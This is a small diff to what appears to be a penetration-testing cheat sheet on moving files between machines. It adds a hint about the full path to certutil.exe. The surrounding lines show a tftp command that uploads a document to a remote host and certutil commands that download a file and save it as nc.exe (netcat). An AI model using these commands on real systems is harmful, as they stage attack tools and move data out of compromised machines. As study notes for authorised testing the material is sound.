@@ -131,6 +131,7 @@ tftp -i 10.11.0.4 put important.docx
 certutil.exe -urlcache -split -f http://example.com/a.txt C:\Users\Public\nc.exe
 certutil.exe -urlcache -split -f http://example.com/a.txt C:\\Users\\Public\\nc.exe
 ```
+if cant find certutil.exe, use C:\Windows\System32\certutil.exe 
 ### smb server to transfer file (Windows to linux)
 ```
 linux:
